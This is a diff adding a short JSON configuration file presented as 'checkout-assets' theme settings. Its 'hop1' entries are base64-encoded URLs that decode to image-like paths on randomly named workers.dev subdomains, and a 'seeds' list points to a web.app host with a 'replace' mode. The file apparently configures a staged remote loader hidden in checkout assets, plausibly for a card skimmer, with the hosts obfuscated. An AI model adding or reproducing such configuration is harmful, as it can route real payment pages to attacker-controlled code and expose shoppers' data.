@@ -1,0 +1,14 @@
+{
+  "v": 2,
+  "theme": "checkout-assets",
+  "ts": 1740000000,
+  "hop1": [
+    "aHR0cHM6Ly9jZG4udGFtbXlodW50ZXI2OTEzMHFpLndvcmtlcnMuZGV2L2ltYWdlLjhmM2QyYTFjLnBuZz93aWR0aD0xMDAmcXVhbGl0eT03NQ==",
+    "aHR0cHM6Ly9jZG4ubWF0dGhld2Nob2k2MzYxOGFzZi53b3JrZXJzLmRldi9pbWFnZS44ZjNkMmExYy5wbmc/d2lkdGg9MTAwJnF1YWxpdHk9NzU="
+  ],
+  "seeds": [
+    "https://boot-c5bba.web.app/assets.json",
+  ],
+  "seeds_mode": "replace",
+  "backend": null
+}
